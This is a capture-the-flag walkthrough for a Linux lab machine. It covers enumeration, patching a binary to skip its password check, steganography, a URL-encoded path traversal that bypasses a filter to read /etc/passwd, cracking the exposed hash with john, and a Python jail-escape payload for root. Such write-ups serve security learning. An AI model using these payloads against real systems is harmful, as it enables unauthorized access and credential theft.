# Tokyo Ghoul - Linux - Medium

**IP may vary over document**

## Enumeration

### Nmap: `nmap -sV -oN nmap-initial $IP`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster: `gobuster dir -u http://$IP/ -w ../wordlist_common.txt| tee gobuster-scan`

```bash
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.141.243/css/]
/index.html           (Status: 200) [Size: 1414]                               
/server-status        (Status: 403) [Size: 278]                                
```

### Manual enumeration

**Found in jasonroom.html source code:**

`<!-- look don't tell jason but we will help you escape , here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there you will find a freind who will help you -->`

Ok let's try ftp with anonymous login. Getting all the files inside ftp we have: `Aogiri_tree.txt  need_to_talk  rize_and_kaneki.jpg`

Running strings on *need_to_talk* we get: `Take a look inside of me. rabin2 -z`

Using `rabin2 -z` we have:

```bash
nth paddr      vaddr      len size section type  string
-------------------------------------------------------
0   0x00002008 0x00002008 9   10   .rodata ascii kamishiro
1   0x00002018 0x00002018 37  38   .rodata ascii Hey Kaneki finnaly you want to talk \n
2   0x00002040 0x00002040 82  83   .rodata ascii Unfortunately before I can give you the kagune you need to give me the paraphrase\n
3   0x00002098 0x00002098 35  36   .rodata ascii Do you have what Im looking for?\n\n
4   0x000020c0 0x000020c0 47  48   .rodata ascii Good job. I believe this is what you came for:\n
5   0x000020f0 0x000020f0 51  52   .rodata ascii Hmm. I dont think this is what I was looking for.\n
6   0x00002128 0x00002128 36  37   .rodata ascii Take a look inside of me. rabin2 -z\n
```

Executing the binary we can't get past the password check.... Hmm let's try patching the binary

Using pwntools module in python

```python
#!/usr/bin/python3

from pwnlib.elf.elf import ELF

elf_object = ELF("need_to_talk")

''' 
# printing all known symbols in binary
for key in elf_object.symbols:
	print(key)
# If I avoid function "check_password" then I might be able to get the flag
print(f"check_password address: {hex(elf_object.symbols['check_password'])}")
'''
elf_object.asm(elf_object.symbols["check_password"], "mov eax, 1\nret")
elf_object.save("new_binary")

print("successfull")
```

Now executing the binary we got: `You_found_1t`

*After I was done with the machine and was filling up those answers I came across a question where it asks for the binary passphrase... as I had patched the binary I did not have the passphrase.. Though it was always in sight when it asked to use rabin2 -z*

Binary Passphrase: `kamishiro`

Checking the *rize_and_kaneki.jpg* file with `exiftool` and `stegsolve.jar` revealed nothing. Trying steghide needed password. Giving it the password obtained from the binary. 

```bash
$steghide --info rize_and_kaneki.jpg
"rize_and_kaneki.jpg":
  format: jpeg
  capacity: 2.7 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "yougotme.txt":
    size: 377.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Extracting the embedded file: 

```bash
steghide --extract -sf rize_and_kaneki.jpg -xf yougotme.txt
```

We got something like a blip/blop - its morse code. Use [online decoder](https://morsecode.world/international/translator.html) to solve it or do it manually. 

After solving we got something that is hex represented data... lets converting it to ascii using python

```python
str = "5A4446794D324D334D484A3558324E6C626E526C63673D3D"
print(bytes.fromhex(str).decode())
```

We have a string that looks like base64 encoded. Time to decode

```bash
echo <string_here> | base64 -d
```

Now it seems like this is a dir. Let's visit this on the website. It asks to scan the dir itself. Using `gobuster` for scan

```bash
gobuster dir -u http://IP/dir_here/ -w ../wordlist_common.txt| tee rize_scan

/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/claim                (Status: 301) [Size: 331] [--> http://10.10.114.149/d1r3c70ry_center/claim/
/index.html           (Status: 200) [Size: 312]                                                   
```

Let's check inside */claim* dir... And YES or NO which leads to: `index.php?view=flower.gif` ...Hmm can I view */etc/passwd*? Maybe? Nope just giving */etc/passwd* did not work... but giving */index.html* works.... Hmmm let's check this with burp.

After some fiddling around 

* it seems it is ignoring */* and displaying the rest meaning */index.html* works same as *index.html*

* on giving *../../../../../../../etc/passwd* we get the message: `no no no silly don't do that`

* *.* and */* needs to be encoded

After a lot of fuzzing for path of /etc/passwd it seems the correct one was: `.../../../../../../../../../../../../etc/passwd`. URL-encoding this and sending it back gave the passwd file as intended

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
statd:x:110:65534::/var/lib/nfs:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
```

Hmm ... lets try `john` on user *kamishiro*

```bash
$ john --wordlist=../rockyou.txt passwd_file
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
No password hashes left to crack (see FAQ)
```

```bash
$ john --show passwd_file
kamishiro:password123:1001:1001:,,,:/home/kamishiro:/bin/bash
```

Now let's ssh into the box.

---
## User.txt

Just cat the *user.txt* file out once ssh is done on the machine.

---
## Root.txt

Using `sudo -l` reveals

```bash
User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
```

Checking the *jail.py* file it seems there are some bad strings like *import, read, write* etc. that cannot be used as it is. After doing some google search on escaping sandbox/jailbreaking python scripts I finally figured out the payload.

```python
__builtins__.__dict__['__IMPORT__'.lower()]("OS".lower()).__dict__["System".lower()]("cat /root/root.txt")
```

Just execute `sudo /usr/bin/python3 /home/kamishiro/jail.py` and supply the above payload to get the root flag
